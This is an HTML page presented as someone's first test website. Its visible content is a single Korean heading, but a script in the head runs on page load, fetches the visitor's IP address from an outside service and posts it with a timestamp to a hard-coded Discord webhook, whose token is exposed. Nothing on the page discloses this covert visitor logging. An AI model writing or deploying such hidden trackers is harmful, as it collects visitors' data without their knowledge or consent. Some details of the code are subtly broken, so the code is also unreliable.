<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>test site</title>
    <script>
        // 1. 여기에 본인의 디스코드 웹훅 URL을 입력해 주세요.
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554079546448285738/bPvvBD1kInPi0nVVwC1y9rMM1RUo3aApOciZMQyGjx1Sa0Aids9GLlCPfJ9B_nRpGx3-";

        // 2. 사이트에 접속하자마자 자동으로 실행되는 코드
        window.onload = async function() {
            try {
                // 외부 API를 이용해 방문자의 IP 주소를 가져옵니다.
                const response = await fetch('https://ipify.org');
                const data = await response.json();
                const clientIp = data.ip;

                // 디스코드로 보낼 메시지 양식 설정
                const payload = {
                    content: `🚨 **새로운 방문자 발생**\n- **IP 주소:** \`\${clientIp}\`\n- **접속 시간:** ${new Date().toLocaleString()}`
                };

                // 디스코드 웹훅으로 데이터 전송
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (error) {
                console.error('IP 로깅 중 오류 발생:', error);
            }
        };
    </script>
</head>
<body>
    <h1>첨으로 웹사이트 만듬ㅋ</h1>
</body>
</html>
